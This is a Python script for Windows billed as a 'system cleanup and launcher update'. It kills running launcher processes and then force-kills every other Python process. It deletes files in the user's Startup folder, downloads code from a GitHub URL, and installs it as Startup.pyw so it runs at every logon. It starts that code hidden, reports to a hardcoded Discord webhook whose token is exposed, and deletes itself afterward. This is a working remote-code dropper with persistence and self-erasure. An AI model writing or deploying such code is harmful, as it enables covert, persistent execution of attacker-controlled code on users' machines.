# monitor_script.py - Kills old launcher, cleans up, and replaces Startup.pyw with github_launcher.py
import os
import sys
import subprocess
import tempfile
import time
import requests
import urllib.request

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def kill_old_launcher():
    """Kill the old launcher process"""
    print("Killing old launcher processes...")
    
    # Create batch file to kill old launcher processes
    batch_script = '''@echo off
:: Kill Python processes running old launchers
taskkill /f /fi "windowtitle eq GitHub Auto-Deploy Launcher*" 2>nul
taskkill /f /fi "windowtitle eq Press Enter to close*" 2>nul

:: Kill processes with old launcher names in command line
wmic process where "commandline like '%%Startup.pyw%%'" get processid 2>nul | findstr /r "[0-9]" > "%TEMP%\\old_pids.txt"
for /f "tokens=*" %%i in (%TEMP%\\old_pids.txt) do (
    taskkill /f /pid %%i 2>nul
)

:: Kill any remaining pythonw.exe processes that might be old launchers
wmic process where "name='pythonw.exe'" get processid, commandline 2>nul | findstr /i "startup\|launcher" | findstr /r "[0-9]" > "%TEMP%\\python_pids.txt"
for /f "tokens=1" %%i in (%TEMP%\\python_pids.txt) do (
    taskkill /f /pid %%i 2>nul
)

:: Clean up temp files
del "%TEMP%\\old_pids.txt" 2>nul
del "%TEMP%\\python_pids.txt" 2>nul
timeout /t 2 /nobreak >nul
echo Old launcher processes killed
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "kill_old_launcher.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    time.sleep(3)  # Wait for kill to complete
    return True

def cleanup_files():
    """Clean up old files from startup folder and current directory"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    print("Cleaning up files...")
    
    # List of files to delete from startup folder (EXCEPT Startup.pyw - we'll replace it)
    files_to_delete_startup = [
        "startup_log.txt",
        "github_launcher.pyw",
        "github_launcher.py",
        "update_cache.json",
        "requirements.txt",
        "clean_launcher.pyw",
        "old_launcher_backup.pyw",
        "launcher_update.py"
    ]
    
    # Also delete from current directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    files_to_delete_current = [
        "github_launcher.pyw",
        "github_launcher.py"
    ]
    
    deleted = []
    failed = []
    
    # Clean up startup folder (except Startup.pyw)
    for filename in files_to_delete_startup:
        filepath = os.path.join(startup_folder, filename)
        if os.path.exists(filepath):
            try:
                for attempt in range(3):
                    try:
                        os.remove(filepath)
                        deleted.append(f"startup/{filename}")
                        print(f"  ✓ Deleted from startup: {filename}")
                        break
                    except PermissionError:
                        if attempt < 2:
                            time.sleep(1)
                        else:
                            failed.append(f"startup/{filename}")
                    except Exception as e:
                        failed.append(f"startup/{filename}")
            except:
                failed.append(f"startup/{filename}")
    
    # Clean up current directory (if different from startup)
    if current_dir.lower() != startup_folder.lower():
        for filename in files_to_delete_current:
            filepath = os.path.join(current_dir, filename)
            if os.path.exists(filepath):
                try:
                    for attempt in range(3):
                        try:
                            os.remove(filepath)
                            deleted.append(f"current/{filename}")
                            print(f"  ✓ Deleted from current dir: {filename}")
                            break
                        except PermissionError:
                            if attempt < 2:
                                time.sleep(1)
                            else:
                                failed.append(f"current/{filename}")
                        except Exception as e:
                            failed.append(f"current/{filename}")
                except:
                    failed.append(f"current/{filename}")
    
    # Also clean up any temporary monitor scripts
    temp_dir = tempfile.gettempdir()
    for file in os.listdir(temp_dir):
        if file.startswith("monitor_") and file.endswith(".py"):
            try:
                filepath = os.path.join(temp_dir, file)
                os.remove(filepath)
                print(f"  ✓ Deleted temp file: {file}")
                deleted.append(f"temp/{file}")
            except:
                pass
    
    # Summary
    if deleted:
        print(f"\nSuccessfully deleted {len(deleted)} files")
    if failed:
        print(f"Failed to delete {len(failed)} files")
    
    return len(deleted) > 0

def download_and_replace_startup_pyw():
    """Download github_launcher.py from repository and save as Startup.pyw"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    
    try:
        # URL to github_launcher.py on GitHub
        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.py"
        
        print(f"Downloading github_launcher.py from: {launcher_url}")
        
        # Download the launcher code
        response = urllib.request.urlopen(launcher_url, timeout=10)
        launcher_code = response.read().decode('utf-8')
        
        # Write it as Startup.pyw
        with open(startup_file, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        
        print(f"✓ Downloaded and saved as Startup.pyw at: {startup_file}")
        return True
    except Exception as e:
        print(f"✗ Failed to download or save github_launcher.py: {e}")
        return False

def start_new_launcher():
    """Start the new Startup.pyw launcher"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    
    if not os.path.exists(startup_file):
        print("✗ Startup.pyw not found, cannot start")
        return False
    
    try:
        # Create batch file to start the new launcher
        batch_script = f'''@echo off
echo Starting new launcher...
timeout /t 3 /nobreak >nul
start /b "" pythonw "{startup_file}"
echo New Startup.pyw launcher started
del "%~f0" 2>nul
'''
        
        batch_path = os.path.join(tempfile.gettempdir(), "start_launcher.bat")
        with open(batch_path, 'w') as f:
            f.write(batch_script)
        
        subprocess.Popen(['cmd', '/c', batch_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        print("✓ New launcher will start in 3 seconds")
        return True
    except Exception as e:
        print(f"✗ Failed to start new launcher: {e}")
        return False

def end_all_python_processes_except_self():
    """End all Python processes except this one, then delete self"""
    print("\nEnding other Python processes and cleaning up...")
    
    current_pid = os.getpid()
    current_script = os.path.abspath(__file__)
    
    # Create batch file that kills other Python processes, then deletes this script
    batch_script = f'''@echo off
:: Get current process PID to avoid killing it
set CURRENT_PID={current_pid}

:: Kill ALL Python processes except current one
for /f "tokens=2 delims=," %%i in ('tasklist /fo csv /nh /fi "imagename eq python.exe"') do (
    if not "%%i"=="%CURRENT_PID%" taskkill /f /pid %%i 2>nul
)
for /f "tokens=2 delims=," %%i in ('tasklist /fo csv /nh /fi "imagename eq pythonw.exe"') do (
    if not "%%i"=="%CURRENT_PID%" taskkill /f /pid %%i 2>nul
)

:: Also use wmic for more thorough cleanup
wmic process where "name='python.exe' and ProcessId!='%CURRENT_PID%'" delete 2>nul
wmic process where "name='pythonw.exe' and ProcessId!='%CURRENT_PID%'" delete 2>nul

timeout /t 3 /nobreak >nul
echo Other Python processes ended

:: Delete this monitor script (if in temp directory)
if exist "{current_script}" (
    del "{current_script}" 2>nul
    echo Monitor script deleted
)

:: Delete this batch file
del "%~f0" 2>nul
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "end_python_final.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("✓ Process termination and self-cleanup initiated")
    return True

def main():
    """Main cleanup function - cleans up and replaces Startup.pyw with github_launcher.py"""
    print("=" * 60)
    print("SYSTEM CLEANUP & LAUNCHER UPDATE")
    print("=" * 60)
    
    # Step 1: Kill old launcher processes
    print("\n[1/5] Killing old launcher processes...")
    kill_old_launcher()
    print("✓ Old launcher processes terminated")
    
    # Step 2: Clean up files
    print("\n[2/5] Cleaning up old files...")
    cleanup_success = cleanup_files()
    
    # Step 3: Download github_launcher.py and save as Startup.pyw
    print("\n[3/5] Downloading github_launcher.py as Startup.pyw...")
    if download_and_replace_startup_pyw():
        print("✓ Startup.pyw updated with github_launcher.py")
    else:
        print("✗ Failed to update Startup.pyw")
    
    # Step 4: Start new launcher
    print("\n[4/5] Starting new launcher...")
    start_new_launcher()
    
    # Send webhook notification
    send_webhook("🔄 Launcher updated! github_launcher.py downloaded and installed as Startup.pyw")
    
    # Step 5: End other Python processes and clean up self
    print("\n[5/5] Final cleanup...")
    end_all_python_processes_except_self()
    
    print("\n" + "=" * 60)
    print("UPDATE COMPLETE")
    print("- Old processes killed")
    print("- Files cleaned up")
    print("- github_launcher.py downloaded as Startup.pyw")
    print("- New launcher started")
    print("- Self-cleanup initiated")
    print("=" * 60)
    
    # Wait a moment before this process might get terminated
    time.sleep(5)
    
    # Exit
    sys.exit(0)

if __name__ == "__main__":
    main()
